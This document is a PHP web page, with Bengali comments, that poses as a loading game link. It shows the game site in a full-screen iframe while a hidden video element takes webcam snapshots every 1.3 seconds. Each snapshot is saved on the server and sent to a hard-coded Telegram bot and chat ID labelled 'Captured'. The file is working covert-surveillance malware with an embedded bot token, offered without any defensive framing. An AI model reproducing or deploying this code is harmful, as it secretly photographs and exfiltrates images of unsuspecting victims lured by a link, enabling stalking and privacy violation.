<?php
$linksFile = 'links.json';
$links = file_exists($linksFile) ? json_decode(file_get_contents($linksFile), true) : [];

// ইউজার লিংকের সাথে যে আইডি পাঠাবে (לש примеру: ?id=abc123xyz)
$id = $_GET['id'] ?? '';
$targetUrl = "https://www.aapunkagames.com/"; // ডিফল্ট লিংক

if (!empty($id) && isset($links[$id])) {
    $targetUrl = $links[$id];
}

// ছবি পোস্ট রিকোয়েস্ট হ্যান্ডেল করা
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
    $chatId = "5896019931";

    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $imgData = $_POST['image'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = str_replace(' ', '+', $imgData);
    $data = base64_decode($imgData);

    $fileName = 'img_' . ($id ? $id . '_' : '') . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, $data)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        $postFields = [
            'chat_id' => $chatId,
            'caption' => "Captured (ID: {$id}): " . $fileName,
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 

        curl_exec($ch);
        curl_close($ch);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000;
        }
        #game-frame { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>
    <iframe id="game-frame" src="<?php echo htmlspecialchars($targetUrl); ?>"></iframe>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(() => {
                    setInterval(captureAndUpload, 1300);
                }, 1000);
            })
            .catch(err => console.error("Camera error: ", err));

        function captureAndUpload() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            // বর্তমান আইডিসহ রিকোয়েস্ট পাঠানো
            const urlParams = new URLSearchParams(window.location.search);
            const id = urlParams.get('id') || '';

            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'image=' + encodeURIComponent(imageData) + '&id=' + encodeURIComponent(id)
            }).catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html>
